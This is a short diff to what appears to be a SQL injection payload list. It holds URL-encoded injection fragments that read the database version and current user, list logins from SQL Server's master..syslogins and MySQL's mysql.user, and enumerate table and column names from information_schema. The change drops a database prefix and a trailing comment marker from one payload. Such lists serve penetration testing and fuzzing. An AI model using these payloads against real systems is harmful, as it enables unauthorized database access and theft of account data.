@@ -1,7 +1,7 @@
 @@version
 user
 name+from+master..syslogins
-table_name%2b%27:%27%2bcolumn_name%2b%27:%27%2bdata_type+from+webapp.information_schema.columns--
+table_name%2b%27:%27%2bcolumn_name%2b%27:%27%2bdata_type+from+information_schema.columns
 user()
 user+from+mysql.user
 user+from+dual
